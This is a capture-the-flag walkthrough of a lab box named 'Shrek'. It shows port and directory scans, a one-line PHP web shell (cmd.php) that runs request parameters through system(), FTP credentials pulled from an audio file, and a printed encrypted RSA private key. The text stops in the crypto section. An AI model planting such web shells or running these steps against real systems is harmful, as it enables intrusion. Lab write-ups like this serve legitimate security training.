#### Shrek

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Media Forensics](#media-forensics)
- [Crypto](#crypto)
- [Privilege Escalation using Chown file reference trick]()

###### Attacker Info

```sh
root@kali:~/shrek# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 1810  bytes 238957 (233.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1650  bytes 204885 (200.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.13  netmask 255.255.254.0  destination 10.10.14.13
        inet6 dead:beef:2::100b  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::49dd:16a6:2507:33ac  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 1303  bytes 88835 (86.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1341  bytes 70349 (68.7 KiB)
        TX errors 0  dropped 407 overruns 0  carrier 0  collisions 0

root@kali:~/shrek#
```

###### Nmap Scan

```sh
root@kali:~/shrek# nmap -sV -sC -oA shrek.nmap 10.10.10.47

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-03 10:44 EST
Nmap scan report for 10.10.10.47
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (EdDSA)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Unix)
|_http-title: Home
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.34 seconds
root@kali:~/shrek#
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

``cmd.php``

```php
<?php echo system($_REQUEST['cmd']); ?>
```

![](images/7.png)

```sh
root@kali:~/shrek# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.47 -t 25

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.47/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/memes (Status: 301)
```

![](images/8.png)

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

###### Media Forensics

```sh
root@kali:~/shrek# file 'Smash Mouth - All Star.mp3'
Smash Mouth - All Star.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, Stereo
root@kali:~/shrek#
```

![](images/13.png)

```
<Ctrl+C> <Ctrl+N> <Ctrl+V>
```

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

![](images/21.png)

![](images/22.png)

```
FTP:
donkey
d0nk3y1337!
```

```sh
root@kali:~# ftp 10.10.10.47
Connected to 10.10.10.47.
220 (vsFTPd 3.0.3)
Name (10.10.10.47:root): donkey
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           15360 Feb 03 09:51 0b27639d925447be82dae283ee16b890.txt
-rw-r--r--    1 0        0           10240 Feb 03 09:51 1076321ec5cc459c9b3aa2d30ae69e29.txt
-rw-r--r--    1 0        0            8192 Feb 03 09:51 19be5a31758444efb13c5738ce6a2cf2.txt
-rw-r--r--    1 0        0           14336 Feb 03 09:51 1ab8807e82154be9a016d5db24cf8f90.txt
-rw-r--r--    1 0        0            5120 Feb 03 09:51 1c2774f2bf9445119a9b154477c941fe.txt
-rw-r--r--    1 0        0            6144 Feb 03 09:51 22760f59f43e42ad9465b0ec53692213.txt
-rw-r--r--    1 0        0            3072 Feb 03 09:51 3db8451a1d364c308d04511c33d7fc59.txt
-rw-r--r--    1 0        0            9216 Feb 03 09:51 43197cad5c5042bfb00a27567e7c6ebf.txt
-rw-r--r--    1 0        0           11264 Feb 03 09:51 49fe86ccd62d44068c2f28ed965804ed.txt
-rw-r--r--    1 0        0            8192 Feb 03 09:51 5084610578fb41dba4cdf3b260ac1085.txt
-rw-r--r--    1 0        0            3102 Feb 03 09:51 5277303919c54844bc86e5d207fa8439.txt
-rw-r--r--    1 0        0            8192 Feb 03 09:51 5aff483807c04d83b9db0b4567b42d3b.txt
-rw-r--r--    1 0        0            6144 Feb 03 09:51 5b735ea859d5417889901bde7ff7b71a.txt
-rw-r--r--    1 0        0           13312 Feb 03 09:51 6325500c28c54b9dad9aa8343bb129cc.txt
-rw-r--r--    1 0        0           15360 Feb 03 09:51 7464fe273b0c44c3851191ba0e1bd7f5.txt
-rw-r--r--    1 0        0            3072 Feb 03 09:51 7d3b34c882994b438466be57c72d55de.txt
-rw-r--r--    1 0        0           15360 Feb 03 09:51 80bf4097d3d041aabdb41078fb7ad0a5.txt
-rw-r--r--    1 0        0           10240 Feb 03 09:51 9934f77c0b1f4e36b8e828977b989367.txt
-rw-r--r--    1 0        0            5120 Feb 03 09:51 b29c7ceee4ef4da7a1b3bbb6305479cc.txt
-rw-r--r--    1 0        0            3072 Feb 03 09:51 c077c43f7a384ce2bc5ccf1b5cf55597.txt
-rw-r--r--    1 0        0           12288 Feb 03 09:51 c088f28fa73b414a83e3f0821e4196e5.txt
-rw-r--r--    1 0        0            3072 Feb 03 09:51 c87a9ef3d35543aebcebe7de02619fd2.txt
-rw-r--r--    1 0        0            6144 Feb 03 09:51 cf1ad69cf2564d68a0505f0e8c43fe4e.txt
-rw-r--r--    1 0        0            9216 Feb 03 09:51 d509487a67ac4bcc8354af75f1a3f0af.txt
-rw-r--r--    1 0        0            3072 Feb 03 09:51 d8470e863a404388b89e7085c6b67954.txt
-rw-r--r--    1 0        0            8192 Feb 03 09:51 dc2afe787da547ae9d8d7e58054e986b.txt
-rw-r--r--    1 0        0            9216 Feb 03 09:51 e0ebe794a89a4c25a77261dbf9ee0166.txt
-rw-r--r--    1 0        0           10670 Feb 03 09:51 f6b6e3ae56554402b242fb3db6db3e31.txt
-rw-r--r--    1 0        0            8192 Feb 03 09:51 fa502cc957ca4516a4e76ba1514bd76c.txt
-rw-r--r--    1 0        0            4096 Feb 03 09:51 fbe57ca9c91d4c728448b96745139f27.txt
-rw-r--r--    1 0        0           10240 Feb 03 09:51 fddf0d406b8a48ef9d1d921a6cb760a7.txt
-rw-r--r--    1 0        0            1766 Aug 16 00:48 key
226 Directory send OK.
ftp> mget *
mget 0b27639d925447be82dae283ee16b890.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 0b27639d925447be82dae283ee16b890.txt (15360 bytes).
226 Transfer complete.
15360 bytes received in 0.20 secs (73.7039 kB/s)
mget 1076321ec5cc459c9b3aa2d30ae69e29.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 1076321ec5cc459c9b3aa2d30ae69e29.txt (10240 bytes).
226 Transfer complete.
10240 bytes received in 0.00 secs (10.7551 MB/s)
mget 19be5a31758444efb13c5738ce6a2cf2.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 19be5a31758444efb13c5738ce6a2cf2.txt (8192 bytes).
226 Transfer complete.
8192 bytes received in 0.00 secs (7.7428 MB/s)
mget 1ab8807e82154be9a016d5db24cf8f90.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 1ab8807e82154be9a016d5db24cf8f90.txt (14336 bytes).
226 Transfer complete.
14336 bytes received in 0.00 secs (9.5608 MB/s)
mget 1c2774f2bf9445119a9b154477c941fe.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 1c2774f2bf9445119a9b154477c941fe.txt (5120 bytes).
226 Transfer complete.
5120 bytes received in 0.00 secs (8.3610 MB/s)
mget 22760f59f43e42ad9465b0ec53692213.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 22760f59f43e42ad9465b0ec53692213.txt (6144 bytes).
226 Transfer complete.
6144 bytes received in 0.00 secs (5.2223 MB/s)
mget 3db8451a1d364c308d04511c33d7fc59.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 3db8451a1d364c308d04511c33d7fc59.txt (3072 bytes).
226 Transfer complete.
3072 bytes received in 0.00 secs (48.8281 MB/s)
mget 43197cad5c5042bfb00a27567e7c6ebf.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 43197cad5c5042bfb00a27567e7c6ebf.txt (9216 bytes).
226 Transfer complete.
9216 bytes received in 0.00 secs (79.9006 MB/s)
mget 49fe86ccd62d44068c2f28ed965804ed.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 49fe86ccd62d44068c2f28ed965804ed.txt (11264 bytes).
226 Transfer complete.
11264 bytes received in 0.00 secs (11.8176 MB/s)
mget 5084610578fb41dba4cdf3b260ac1085.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 5084610578fb41dba4cdf3b260ac1085.txt (8192 bytes).
226 Transfer complete.
8192 bytes received in 0.00 secs (9.1589 MB/s)
mget 5277303919c54844bc86e5d207fa8439.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 5277303919c54844bc86e5d207fa8439.txt (3102 bytes).
226 Transfer complete.
3102 bytes received in 0.00 secs (4.2261 MB/s)
mget 5aff483807c04d83b9db0b4567b42d3b.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 5aff483807c04d83b9db0b4567b42d3b.txt (8192 bytes).
226 Transfer complete.
8192 bytes received in 0.00 secs (13.0426 MB/s)
mget 5b735ea859d5417889901bde7ff7b71a.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 5b735ea859d5417889901bde7ff7b71a.txt (6144 bytes).
226 Transfer complete.
6144 bytes received in 0.00 secs (4.7560 MB/s)
mget 6325500c28c54b9dad9aa8343bb129cc.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 6325500c28c54b9dad9aa8343bb129cc.txt (13312 bytes).
226 Transfer complete.
13312 bytes received in 0.00 secs (15.4069 MB/s)
mget 7464fe273b0c44c3851191ba0e1bd7f5.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 7464fe273b0c44c3851191ba0e1bd7f5.txt (15360 bytes).
226 Transfer complete.
15360 bytes received in 0.20 secs (74.0664 kB/s)
mget 7d3b34c882994b438466be57c72d55de.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 7d3b34c882994b438466be57c72d55de.txt (3072 bytes).
226 Transfer complete.
3072 bytes received in 0.00 secs (3.5728 MB/s)
mget 80bf4097d3d041aabdb41078fb7ad0a5.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 80bf4097d3d041aabdb41078fb7ad0a5.txt (15360 bytes).
226 Transfer complete.
15360 bytes received in 0.20 secs (73.3615 kB/s)
mget 9934f77c0b1f4e36b8e828977b989367.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for 9934f77c0b1f4e36b8e828977b989367.txt (10240 bytes).
226 Transfer complete.
10240 bytes received in 0.00 secs (10.9850 MB/s)
mget b29c7ceee4ef4da7a1b3bbb6305479cc.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for b29c7ceee4ef4da7a1b3bbb6305479cc.txt (5120 bytes).
226 Transfer complete.
5120 bytes received in 0.00 secs (4.4920 MB/s)
mget c077c43f7a384ce2bc5ccf1b5cf55597.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for c077c43f7a384ce2bc5ccf1b5cf55597.txt (3072 bytes).
226 Transfer complete.
3072 bytes received in 0.00 secs (6.2600 MB/s)
mget c088f28fa73b414a83e3f0821e4196e5.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for c088f28fa73b414a83e3f0821e4196e5.txt (12288 bytes).
226 Transfer complete.
12288 bytes received in 0.00 secs (7.3982 MB/s)
mget c87a9ef3d35543aebcebe7de02619fd2.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for c87a9ef3d35543aebcebe7de02619fd2.txt (3072 bytes).
226 Transfer complete.
3072 bytes received in 0.00 secs (2.7587 MB/s)
mget cf1ad69cf2564d68a0505f0e8c43fe4e.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cf1ad69cf2564d68a0505f0e8c43fe4e.txt (6144 bytes).
226 Transfer complete.
6144 bytes received in 0.00 secs (5.0468 MB/s)
mget d509487a67ac4bcc8354af75f1a3f0af.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for d509487a67ac4bcc8354af75f1a3f0af.txt (9216 bytes).
226 Transfer complete.
9216 bytes received in 0.00 secs (4.7560 MB/s)
mget d8470e863a404388b89e7085c6b67954.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for d8470e863a404388b89e7085c6b67954.txt (3072 bytes).
226 Transfer complete.
3072 bytes received in 0.00 secs (1.9061 MB/s)
mget dc2afe787da547ae9d8d7e58054e986b.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dc2afe787da547ae9d8d7e58054e986b.txt (8192 bytes).
226 Transfer complete.
8192 bytes received in 0.00 secs (15.5010 MB/s)
mget e0ebe794a89a4c25a77261dbf9ee0166.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for e0ebe794a89a4c25a77261dbf9ee0166.txt (9216 bytes).
226 Transfer complete.
9216 bytes received in 0.00 secs (11.0554 MB/s)
mget f6b6e3ae56554402b242fb3db6db3e31.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for f6b6e3ae56554402b242fb3db6db3e31.txt (10670 bytes).
226 Transfer complete.
10670 bytes received in 0.00 secs (6.2085 MB/s)
mget fa502cc957ca4516a4e76ba1514bd76c.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fa502cc957ca4516a4e76ba1514bd76c.txt (8192 bytes).
226 Transfer complete.
8192 bytes received in 0.00 secs (10.6728 MB/s)
mget fbe57ca9c91d4c728448b96745139f27.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fbe57ca9c91d4c728448b96745139f27.txt (4096 bytes).
226 Transfer complete.
4096 bytes received in 0.00 secs (8.4186 MB/s)
mget fddf0d406b8a48ef9d1d921a6cb760a7.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fddf0d406b8a48ef9d1d921a6cb760a7.txt (10240 bytes).
226 Transfer complete.
10240 bytes received in 0.00 secs (8.0708 MB/s)
mget key?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for key (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (1.4997 MB/s)
ftp> 221 Goodbye.
root@kali:~#
```

```sh
root@kali:~# mkdir ftp
root@kali:~# mv *.txt ftp/
root@kali:~# mv key ftp/
root@kali:~# mv ftp/ shrek/
```

```sh
root@kali:~/shrek/ftp# file *txt
0b27639d925447be82dae283ee16b890.txt: ASCII text, with very long lines, with no line terminators
1076321ec5cc459c9b3aa2d30ae69e29.txt: ASCII text, with very long lines, with no line terminators
19be5a31758444efb13c5738ce6a2cf2.txt: ASCII text, with very long lines, with no line terminators
1ab8807e82154be9a016d5db24cf8f90.txt: ASCII text, with very long lines, with no line terminators
1c2774f2bf9445119a9b154477c941fe.txt: ASCII text, with very long lines, with no line terminators
22760f59f43e42ad9465b0ec53692213.txt: ASCII text, with very long lines, with no line terminators
3db8451a1d364c308d04511c33d7fc59.txt: ASCII text, with very long lines, with no line terminators
43197cad5c5042bfb00a27567e7c6ebf.txt: ASCII text, with very long lines, with no line terminators
49fe86ccd62d44068c2f28ed965804ed.txt: ASCII text, with very long lines, with no line terminators
5084610578fb41dba4cdf3b260ac1085.txt: ASCII text, with very long lines, with no line terminators
5277303919c54844bc86e5d207fa8439.txt: ASCII text, with very long lines, with no line terminators
5aff483807c04d83b9db0b4567b42d3b.txt: ASCII text, with very long lines, with no line terminators
5b735ea859d5417889901bde7ff7b71a.txt: ASCII text, with very long lines, with no line terminators
6325500c28c54b9dad9aa8343bb129cc.txt: ASCII text, with very long lines, with no line terminators
7464fe273b0c44c3851191ba0e1bd7f5.txt: ASCII text, with very long lines, with no line terminators
7d3b34c882994b438466be57c72d55de.txt: ASCII text, with very long lines, with no line terminators
80bf4097d3d041aabdb41078fb7ad0a5.txt: ASCII text, with very long lines, with no line terminators
9934f77c0b1f4e36b8e828977b989367.txt: ASCII text, with very long lines, with no line terminators
b29c7ceee4ef4da7a1b3bbb6305479cc.txt: ASCII text, with very long lines, with no line terminators
c077c43f7a384ce2bc5ccf1b5cf55597.txt: ASCII text, with very long lines, with no line terminators
c088f28fa73b414a83e3f0821e4196e5.txt: ASCII text, with very long lines, with no line terminators
c87a9ef3d35543aebcebe7de02619fd2.txt: ASCII text, with very long lines, with no line terminators
cf1ad69cf2564d68a0505f0e8c43fe4e.txt: ASCII text, with very long lines, with no line terminators
d509487a67ac4bcc8354af75f1a3f0af.txt: ASCII text, with very long lines, with no line terminators
d8470e863a404388b89e7085c6b67954.txt: ASCII text, with very long lines, with no line terminators
dc2afe787da547ae9d8d7e58054e986b.txt: ASCII text, with very long lines, with no line terminators
e0ebe794a89a4c25a77261dbf9ee0166.txt: ASCII text, with very long lines, with no line terminators
f6b6e3ae56554402b242fb3db6db3e31.txt: ASCII text, with very long lines, with no line terminators
fa502cc957ca4516a4e76ba1514bd76c.txt: ASCII text, with very long lines, with no line terminators
fbe57ca9c91d4c728448b96745139f27.txt: ASCII text, with very long lines, with no line terminators
fddf0d406b8a48ef9d1d921a6cb760a7.txt: ASCII text, with very long lines, with no line terminators
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# cat key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,94DC7309349E17F8ED6776ED69D6265A

rx7VJS6fzctpfTQ16y9M2CYG701eIh3nDQND+MSFAMSD8JiElqiIH7yA6TpXKPPx
A9gcxf1qlezc3XIhQpsLN9tLJpOxWYMniUo06/7k+2vWO6AzX27hVPRk1vk9OTWG
gRe856uaS8WfQ3XxehHNk1bu710HzBSwZn/XNbHsNo74Bpol8MTm2BTjvnuxnFY8
tvw53nbXMQffBmrwBTvc5aaCk/C0LfvemSxLAgAwMACNpbPmdw9NkUxRDbL/93Q1
ZYMlFxiXhLgFWQFdW/u2WURmOcIuAHd1V8gWIvY10IpH7o4nXaCI4D8PUmnIDt2N
k6Q3Znnfe8BrzFlD1NdG5SfHNdNUn5N9DROk0cZsL+D9e9bQb5CoyL2ioL9fEeRv
4J5w2ZnIHStAez+Za11WGcZsW3jk2eXGPZiD99k5GcazWQ60dv5dUR6J5fkxaibi
unqmN2tDaKReT7aT4Im6pLUscN8t2w8dprgsD/EbMsPr0X/TqOShXXhMUhk/9SAY
2Rvudp97fqYHugIch4lZdDpYS//KRwzO+wQOQARX0tJ0DJ++lY6WNM/BD6+HUk+v
2c3ziM7DL4i7zhA0qnc8796Nxs8D/QTUWjmcNQhcOM4rAYsmyRqyoVe3ciadKWmk
vfwBJYxCwE9I9qUfZS3TsEYdbLE4MjlFB+Zn+fYpyA950hVFDxvu+E8zIcSYA0bJ
GAra2vH/xgmEoptYqeav/sstisJOYPW1Ui3K5C9E0QMH2MRReZoHlToCSNwUOWRo
rY1z3UZMyV5qw3VsuOk+n81P2npyP0RYo6xjAQW/1uN01LPi6y79j/3k9L35N7pH
vJHACTHa1bgCGkYGYm75DRIPYqJKs8g3htPHTbyfAfybeMBFQFxz3SBSWp8T9yjF
+WKUWQ2EmUtgC9n04tLf1/SIldvtOvtwyv2LiIzgvtT6DCMoulprRlb+U0iY1kbQ
lrpUhFtcK1SvC4Z6ebAEoX/jVRWKdbKldr35ECwIiMVNUFhvXwg4JRdmgmeeDga5
66TSTqupISE7q6MuBfesQItkoiairO36enBvYdifN4/kRFBNXo1ZUTzdKVw6/UVo
n9tG9Fnk/z/Ee0iuT3PS0xtu6cBaXzFggm1n73honBjJzIJdtDAJ2AFSMJg6F6TJ
d0BPB0SGfF8rU+s0RjBhr1nE+px9qYKsuPAKkfi/b/EVa5WEacNezUTTKW9v9DjM
ym/zSi9GMDEczlFO2wthN5MXh0XNzUyQxDAcek1uZyaQd66NXQ0AywQG114+XLx8
29sJvTuy6PXJs4ZUCno4/7RQnG9mwHtcV2f3ETASTjtsxBVotzfnpB22jgRND1fi
Ovqy0xbhRUrBhl8MjuE4Ha/ttoKvbDxC6PlVPMfjp3y2sTIDRp7HpAJfKoVMdJ5Y
9FoWkWhrGkshGMIxyF3YE6cyhy8OOvmoEcNjyusCi1VWJpRxWU9Ml+GUH5gsjdAV
yiPvEG4LnM4gGeHhn9CZcrFJSYKIS0s+410YQvpECx09LaLBtq5y0QNkIspuKSPB
UDidMCyboqlc47D6SgNk7WQqut9tFj6PXE3chFFBHGfZ3hF9HnbUWBEiqyvOlAnm
-----END RSA PRIVATE KEY-----
root@kali:~/shrek/ftp#
```

###### Crypto

```sh
root@kali:~/shrek/ftp# for i in `ls *.txt`; do echo $i; base64 -d $i > $i.b64; done
0b27639d925447be82dae283ee16b890.txt
1076321ec5cc459c9b3aa2d30ae69e29.txt
19be5a31758444efb13c5738ce6a2cf2.txt
1ab8807e82154be9a016d5db24cf8f90.txt
1c2774f2bf9445119a9b154477c941fe.txt
22760f59f43e42ad9465b0ec53692213.txt
3db8451a1d364c308d04511c33d7fc59.txt
43197cad5c5042bfb00a27567e7c6ebf.txt
49fe86ccd62d44068c2f28ed965804ed.txt
5084610578fb41dba4cdf3b260ac1085.txt
5277303919c54844bc86e5d207fa8439.txt
base64: invalid input
5aff483807c04d83b9db0b4567b42d3b.txt
5b735ea859d5417889901bde7ff7b71a.txt
6325500c28c54b9dad9aa8343bb129cc.txt
7464fe273b0c44c3851191ba0e1bd7f5.txt
7d3b34c882994b438466be57c72d55de.txt
80bf4097d3d041aabdb41078fb7ad0a5.txt
9934f77c0b1f4e36b8e828977b989367.txt
b29c7ceee4ef4da7a1b3bbb6305479cc.txt
c077c43f7a384ce2bc5ccf1b5cf55597.txt
c088f28fa73b414a83e3f0821e4196e5.txt
c87a9ef3d35543aebcebe7de02619fd2.txt
cf1ad69cf2564d68a0505f0e8c43fe4e.txt
d509487a67ac4bcc8354af75f1a3f0af.txt
d8470e863a404388b89e7085c6b67954.txt
dc2afe787da547ae9d8d7e58054e986b.txt
e0ebe794a89a4c25a77261dbf9ee0166.txt
f6b6e3ae56554402b242fb3db6db3e31.txt
base64: invalid input
fa502cc957ca4516a4e76ba1514bd76c.txt
fbe57ca9c91d4c728448b96745139f27.txt
fddf0d406b8a48ef9d1d921a6cb760a7.txt
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# ls
0b27639d925447be82dae283ee16b890.txt      49fe86ccd62d44068c2f28ed965804ed.txt      80bf4097d3d041aabdb41078fb7ad0a5.txt      d8470e863a404388b89e7085c6b67954.txt
0b27639d925447be82dae283ee16b890.txt.b64  49fe86ccd62d44068c2f28ed965804ed.txt.b64  80bf4097d3d041aabdb41078fb7ad0a5.txt.b64  d8470e863a404388b89e7085c6b67954.txt.b64
1076321ec5cc459c9b3aa2d30ae69e29.txt      5084610578fb41dba4cdf3b260ac1085.txt      9934f77c0b1f4e36b8e828977b989367.txt      dc2afe787da547ae9d8d7e58054e986b.txt
1076321ec5cc459c9b3aa2d30ae69e29.txt.b64  5084610578fb41dba4cdf3b260ac1085.txt.b64  9934f77c0b1f4e36b8e828977b989367.txt.b64  dc2afe787da547ae9d8d7e58054e986b.txt.b64
19be5a31758444efb13c5738ce6a2cf2.txt      5277303919c54844bc86e5d207fa8439.txt      b29c7ceee4ef4da7a1b3bbb6305479cc.txt      e0ebe794a89a4c25a77261dbf9ee0166.txt
19be5a31758444efb13c5738ce6a2cf2.txt.b64  5277303919c54844bc86e5d207fa8439.txt.b64  b29c7ceee4ef4da7a1b3bbb6305479cc.txt.b64  e0ebe794a89a4c25a77261dbf9ee0166.txt.b64
1ab8807e82154be9a016d5db24cf8f90.txt      5aff483807c04d83b9db0b4567b42d3b.txt      c077c43f7a384ce2bc5ccf1b5cf55597.txt      f6b6e3ae56554402b242fb3db6db3e31.txt
1ab8807e82154be9a016d5db24cf8f90.txt.b64  5aff483807c04d83b9db0b4567b42d3b.txt.b64  c077c43f7a384ce2bc5ccf1b5cf55597.txt.b64  f6b6e3ae56554402b242fb3db6db3e31.txt.b64
1c2774f2bf9445119a9b154477c941fe.txt      5b735ea859d5417889901bde7ff7b71a.txt      c088f28fa73b414a83e3f0821e4196e5.txt      fa502cc957ca4516a4e76ba1514bd76c.txt
1c2774f2bf9445119a9b154477c941fe.txt.b64  5b735ea859d5417889901bde7ff7b71a.txt.b64  c088f28fa73b414a83e3f0821e4196e5.txt.b64  fa502cc957ca4516a4e76ba1514bd76c.txt.b64
22760f59f43e42ad9465b0ec53692213.txt      6325500c28c54b9dad9aa8343bb129cc.txt      c87a9ef3d35543aebcebe7de02619fd2.txt      fbe57ca9c91d4c728448b96745139f27.txt
22760f59f43e42ad9465b0ec53692213.txt.b64  6325500c28c54b9dad9aa8343bb129cc.txt.b64  c87a9ef3d35543aebcebe7de02619fd2.txt.b64  fbe57ca9c91d4c728448b96745139f27.txt.b64
3db8451a1d364c308d04511c33d7fc59.txt      7464fe273b0c44c3851191ba0e1bd7f5.txt      cf1ad69cf2564d68a0505f0e8c43fe4e.txt      fddf0d406b8a48ef9d1d921a6cb760a7.txt
3db8451a1d364c308d04511c33d7fc59.txt.b64  7464fe273b0c44c3851191ba0e1bd7f5.txt.b64  cf1ad69cf2564d68a0505f0e8c43fe4e.txt.b64  fddf0d406b8a48ef9d1d921a6cb760a7.txt.b64
43197cad5c5042bfb00a27567e7c6ebf.txt      7d3b34c882994b438466be57c72d55de.txt      d509487a67ac4bcc8354af75f1a3f0af.txt      key
43197cad5c5042bfb00a27567e7c6ebf.txt.b64  7d3b34c882994b438466be57c72d55de.txt.b64  d509487a67ac4bcc8354af75f1a3f0af.txt.b64
root@kali:~/shrek/ftp#
```

```sh
root@kali:~/shrek/ftp# cat 5277303919c54844bc86e5d207fa8439.txt
xxycrogvbrqhccjvqqgtavdkbcugmcrstjqnoyqlpxatkugeephtuzusjfdyrhvwhwgitlziqodzjwajqpdbggjtupdrihipibmjrvzxyeagxtaygbiacxbyopzmstvjyonkewwocvrrjihhlhdfnsdfxteiffmcdyluopcfhytjfxfesbumicgtqessckvpxjxpsgyocvhugxfnwzrbbvvtqlnznirlwpnfmqxehcmaotzkbqrltqucgvxsuwvpzchhvjtshngtrouoylpfrefvfovlhzjivwpknvqiioglsjywrsxmdwprafhvmpytxjxcqhfsinucfyxgokjjhbizzlaadowbjcnfqcmswefqkuantayftajfuviwgxujlliyeqvmsucsawfdinuwxkateyjjzqduthxbmpgkamckzgbrzslvalnhdbkfiejitzqszgbmurcpusqfcxrwikiwztzxqywxvrilwkjqgxdisancdztdcixyphkcvmuyigzvyceacakbsuthjkyfynjpnzezqrtcojurvjrbphvrgszzpkrqfarlqfgrgubssrahqvzhcywbtklhomwzzzhvhcdpfkvpqkhbiuwgysbdokwjxwhngabtlcopxdcdfvafrnbdnwpztdyxxllltrztaydnjqlfcauplgybpbcnwdzqfplorvaujsvpxcmxrquunlcrmppzdlhwrlkhcntwbuqraoojtleldypfrjmmrdgegnqblcsjgqiueoykazzyqbiqsqttholmgxpvyoxxqbmyyweixlitpspnarfjyhnfnjbuzvohokglybyodglgsftbjstfpsddkmjrxpcqexnacumnpfdshwttpucilzwgpvstbpllottaoehpdfbvzmugnztcifwxsnmifxdhixikyklyxhaayoqjsvjjdthultaqqojmuzsdvjnanvgngeowzotuhfhhaltdoekgdmzjsgbsgfjmjzenuexqigrarnbuivelsrdxjlbwuestsrxcprcuzwtugxrsguaxjkvahbnqptmdjwqrwpictpayqfhprprbfnuqcygzrvjgwcphgibbggrngreebpfxzrjdobbookxhousremdwkipngdweibupldnosdfudrfoqnjyapuyaxoczvoflnnoivgoszatfdzaaelqrsgqfqevtjta